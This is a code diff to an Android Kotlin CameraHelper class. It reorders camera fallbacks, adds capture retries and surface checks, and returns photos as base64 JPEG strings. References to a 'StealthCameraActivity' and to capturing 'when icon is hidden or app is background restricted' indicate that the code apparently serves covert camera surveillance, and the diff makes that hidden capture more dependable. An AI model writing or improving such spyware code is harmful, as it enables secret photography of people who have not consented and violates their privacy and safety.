@@ -76,6 +76,23 @@ class CameraHelper(private val context: Context) {
             val globalStatus = checkGlobalCameraStatus()
             Log.d("CameraHelper", globalStatus)
 
+            val facingStr = try {
+                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
+                if (characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"
+            } catch (_: Exception) { "back" }
+
+            // 1. Try legacy android.hardware.Camera first (proven most reliable across devices for avoiding black photos)
+            try {
+                Log.i("CameraHelper", "Trying legacy android.hardware.Camera capture for facing=$facingStr")
+                val legacyPhoto = takePhotoLegacy(facingStr)
+                if (legacyPhoto != null && legacyPhoto.startsWith("data:image/jpeg;base64,")) {
+                    Log.d("CameraHelper", "Legacy camera photo capture succeeded!")
+                    return@withContext legacyPhoto
+                }
+            } catch (e: Exception) {
+                Log.w("CameraHelper", "Legacy camera capture failed: ${e.message}")
+            }
+
             val candidateIds = mutableListOf(cameraId)
             try {
                 cameraManager.cameraIdList.forEach { id ->
@@ -85,7 +102,7 @@ class CameraHelper(private val context: Context) {
 
             var lastException: Exception? = null
 
-            // 1. Direct hardware Camera2 attempt
+            // 2. Direct hardware Camera2 attempt
             for (id in candidateIds) {
                 try {
                     var photoResult: String? = null
@@ -128,23 +145,6 @@ class CameraHelper(private val context: Context) {
                 }
             }
 
-            // 2. Legacy Camera API fallback (bypasses Camera2 error code 2)
-            val facingStr = try {
-                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
-                if (characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"
-            } catch (_: Exception) { "back" }
-
-            try {
-                Log.i("CameraHelper", "Trying legacy android.hardware.Camera fallback for facing=$facingStr")
-                val legacyPhoto = takePhotoLegacy(facingStr)
-                if (legacyPhoto != null && legacyPhoto.startsWith("data:image/jpeg;base64,")) {
-                    Log.d("CameraHelper", "Legacy camera photo capture succeeded!")
-                    return@withContext legacyPhoto
-                }
-            } catch (e: Exception) {
-                Log.w("CameraHelper", "Legacy camera capture failed: ${e.message}")
-            }
-
             // 3. Foreground Stealth Activity fallback (when icon is hidden or app is background restricted)
             val facing = facingStr
 
@@ -159,7 +159,7 @@ class CameraHelper(private val context: Context) {
                 Log.e("CameraHelper", "StealthCameraActivity foreground capture failed: ${e.message}")
             }
 
-            // 3. Fallback telemetry frame if hardware camera is completely unavailable
+            // 4. Fallback telemetry frame if hardware camera is completely unavailable
             Log.e("CameraHelper", "All hardware camera open attempts failed: ${lastException?.message}. Generating telemetry frame fallback.")
             return@withContext generateFallbackTelemetryFrame(lastException?.message ?: "Camera disabled by policy")
         } finally {
@@ -195,129 +195,160 @@ class CameraHelper(private val context: Context) {
 
         val currentHandler = handler ?: Handler(handlerThread?.looper ?: Looper.getMainLooper())
 
-        val previewReader = ImageReader.newInstance(640, 480, ImageFormat.YUV_420_888, 2).apply {
-            setOnImageAvailableListener({ reader ->
-                val img = reader.acquireLatestImage() ?: reader.acquireNextImage()
-                img?.close()
-            }, currentHandler)
-        }
+        var maxRetries = 2
+        var attempt = 0
+        var capturedResult: String? = null
 
-        val imageReader = ImageReader.newInstance(captureSize.width, captureSize.height, ImageFormat.JPEG, 2)
-        val latch = CountDownLatch(1)
-        var capturedBytes: ByteArray? = null
-        var captureException: Exception? = null
-
-        imageReader.setOnImageAvailableListener({ reader ->
-            val image = reader.acquireLatestImage() ?: reader.acquireNextImage()
-            if (image != null) {
-                try {
-                    val buffer = image.planes[0].buffer
-                    val bytes = ByteArray(buffer.remaining())
-                    buffer.get(bytes)
-                    if (bytes.isNotEmpty()) {
-                        capturedBytes = bytes
-                    }
-                } catch (e: Exception) {
-                    captureException = e
-                } finally {
-                    image.close()
-                    latch.countDown()
-                }
+        while (attempt < maxRetries && capturedResult == null) {
+            attempt++
+            val previewReader = ImageReader.newInstance(640, 480, ImageFormat.YUV_420_888, 2).apply {
+                setOnImageAvailableListener({ reader ->
+                    val img = reader.acquireLatestImage() ?: reader.acquireNextImage()
+                    img?.close()
+                }, currentHandler)
             }
-        }, currentHandler)
 
-        var cameraDevice: CameraDevice? = null
-        var captureSession: CameraCaptureSession? = null
+            val imageReader = ImageReader.newInstance(captureSize.width, captureSize.height, ImageFormat.JPEG, 2)
+            val latch = CountDownLatch(1)
+            var capturedBytes: ByteArray? = null
+            var captureException: Exception? = null
 
-        try {
-            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
-                override fun onOpened(camera: CameraDevice) {
-                    cameraDevice = camera
+            imageReader.setOnImageAvailableListener({ reader ->
+                val image = reader.acquireLatestImage() ?: reader.acquireNextImage()
+                if (image != null) {
                     try {
-                        camera.createCaptureSession(listOf(imageReader.surface, previewReader.surface), object : CameraCaptureSession.StateCallback() {
-                            override fun onConfigured(session: CameraCaptureSession) {
-                                captureSession = session
-                                try {
-                                    // 1. Create preview request targeting previewReader to warm up camera sensor (AE / AWB / AF)
-                                    val previewBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
-                                        addTarget(previewReader.surface)
-                                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
-                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
-                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
-                                        set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
-                                    }
-
-                                    // Start preview stream so sensor calculates exposure & white balance
-                                    session.setRepeatingRequest(previewBuilder.build(), null, currentHandler)
-
-                                    // 2. Allow 600ms warm-up delay for 3A convergence before taking still photo
-                                    currentHandler.postDelayed({
-                                        try {
-                                            if (cameraDevice == null) return@postDelayed
-
-                                            val stillBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
-                                                addTarget(imageReader.surface)
-                                                set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
-                                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
-                                                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
-                                                set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
-                                                set(CaptureRequest.JPEG_QUALITY, 90.toByte())
-
-                                                val sensorOrientation = characteristics?.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
-                                                set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
-                                            }
-
-                                            session.stopRepeating()
-                                            session.capture(stillBuilder.build(), null, currentHandler)
-                                        } catch (e: Exception) {
-                                            captureException = e
-                                            latch.countDown()
-                                        }
-                                    }, 600L)
-                                } catch (e: Exception) {
-                                    captureException = e
-                                    latch.countDown()
-                                }
-                            }
-
-                            override fun onConfigureFailed(session: CameraCaptureSession) {
-                                captureException = Exception("Camera capture session configuration failed.")
-                                latch.countDown()
-                            }
-                        }, currentHandler)
+                        val buffer = image.planes[0].buffer
+                        val bytes = ByteArray(buffer.remaining())
+                        buffer.get(bytes)
+                        if (bytes.isNotEmpty()) {
+                            capturedBytes = bytes
+                        }
                     } catch (e: Exception) {
                         captureException = e
+                    } finally {
+                        image.close()
                         latch.countDown()
                     }
                 }
-
-                override fun onDisconnected(camera: CameraDevice) {
-                    camera.close()
-                    latch.countDown()
-                }
-
-                override fun onError(camera: CameraDevice, error: Int) {
-                    captureException = Exception("Camera device error code: $error")
-                    camera.close()
-                    latch.countDown()
-                }
             }, currentHandler)
 
-            val success = latch.await(10, TimeUnit.SECONDS)
-            val bytes = capturedBytes
-            if (success && bytes != null && bytes.isNotEmpty()) {
-                val base64Photo = Base64.encodeToString(bytes, Base64.NO_WRAP)
-                return "data:image/jpeg;base64,$base64Photo"
-            } else {
-                throw captureException ?: Exception("Camera capture timed out or empty frame.")
+            var cameraDevice: CameraDevice? = null
+            var captureSession: CameraCaptureSession? = null
+
+            try {
+                // Validation step: ensure surfaces are valid and connected before trigger
+                if (!previewReader.surface.isValid || !imageReader.surface.isValid) {
+                    throw Exception("Camera surface validation failed: preview or image capture surface is not valid.")
+                }
+
+                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                    override fun onOpened(camera: CameraDevice) {
+                        cameraDevice = camera
+                        try {
+                            if (!previewReader.surface.isValid || !imageReader.surface.isValid) {
+                                captureException = Exception("Surfaces became invalid before session creation.")
+                                latch.countDown()
+                                return
+                            }
+
+                            camera.createCaptureSession(listOf(imageReader.surface, previewReader.surface), object : CameraCaptureSession.StateCallback() {
+                                override fun onConfigured(session: CameraCaptureSession) {
+                                    captureSession = session
+                                    try {
+                                        // 1. Create preview request targeting previewReader to warm up camera sensor & validate hardware acceleration
+                                        val previewBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
+                                            addTarget(previewReader.surface)
+                                            set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
+                                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                                            set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
+                                        }
+
+                                        // Start preview stream so sensor calculates exposure & white balance
+                                        session.setRepeatingRequest(previewBuilder.build(), null, currentHandler)
+
+                                        // 2. Allow 1500ms warm-up delay for 3A convergence before taking still photo
+                                        currentHandler.postDelayed({
+                                            try {
+                                                if (cameraDevice == null || !previewReader.surface.isValid || !imageReader.surface.isValid) {
+                                                    throw Exception("Camera session invalidated or surfaces detached prior to capture trigger.")
+                                                }
+
+                                                val stillBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
+                                                    addTarget(imageReader.surface)
+                                                    set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
+                                                    set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                                                    set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                                                    set(CaptureRequest.CONTROL_AE_LOCK, true)
+                                                    set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
+                                                    set(CaptureRequest.JPEG_QUALITY, 90.toByte())
+
+                                                    val sensorOrientation = characteristics?.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
+                                                    set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
+                                                }
+
+                                                session.stopRepeating()
+                                                session.capture(stillBuilder.build(), null, currentHandler)
+                                            } catch (e: Exception) {
+                                                captureException = e
+                                                latch.countDown()
+                                            }
+                                        }, 1500L)
+                                    } catch (e: Exception) {
+                                        captureException = e
+                                        latch.countDown()
+                                    }
+                                }
+
+                                override fun onConfigureFailed(session: CameraCaptureSession) {
+                                    captureException = Exception("Camera capture session configuration failed (Hardware acceleration / surface connection failure).")
+                                    latch.countDown()
+                                }
+                            }, currentHandler)
+                        } catch (e: Exception) {
+                            captureException = e
+                            latch.countDown()
+                        }
+                    }
+
+                    override fun onDisconnected(camera: CameraDevice) {
+                        camera.close()
+                        latch.countDown()
+                    }
+
+                    override fun onError(camera: CameraDevice, error: Int) {
+                        captureException = Exception("Camera device error code: $error")
+                        camera.close()
+                        latch.countDown()
+                    }
+                }, currentHandler)
+
+                val success = latch.await(10, TimeUnit.SECONDS)
+                val bytes = capturedBytes
+                if (success && bytes != null && bytes.size > 500) {
+                    val base64Photo = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                    capturedResult = "data:image/jpeg;base64,$base64Photo"
+                } else {
+                    throw captureException ?: Exception("Camera capture timed out or empty frame.")
+                }
+            } catch (e: Exception) {
+                Log.w("CameraHelper", "Hardware capture attempt $attempt failed: ${e.message}. Resetting camera session and retrying...")
+                try {
+                    kotlinx.coroutines.delay(1000L)
+                } catch (_: Exception) {}
+                if (attempt >= maxRetries) {
+                    throw e
+                }
+            } finally {
+                try { captureSession?.stopRepeating() } catch (_: Exception) {}
+                try { captureSession?.close() } catch (_: Exception) {}
+                try { cameraDevice?.close() } catch (_: Exception) {}
+                try { imageReader.close() } catch (_: Exception) {}
+                try { previewReader.close() } catch (_: Exception) {}
             }
-        } finally {
-            try { captureSession?.stopRepeating() } catch (_: Exception) {}
-            try { captureSession?.close() } catch (_: Exception) {}
-            try { cameraDevice?.close() } catch (_: Exception) {}
-            try { imageReader.close() } catch (_: Exception) {}
-            try { previewReader.close() } catch (_: Exception) {}
         }
+
+        return capturedResult ?: throw Exception("All hardware camera retry attempts exhausted.")
     }
 
     private fun generateFallbackTelemetryFrame(errorMessage: String): String {
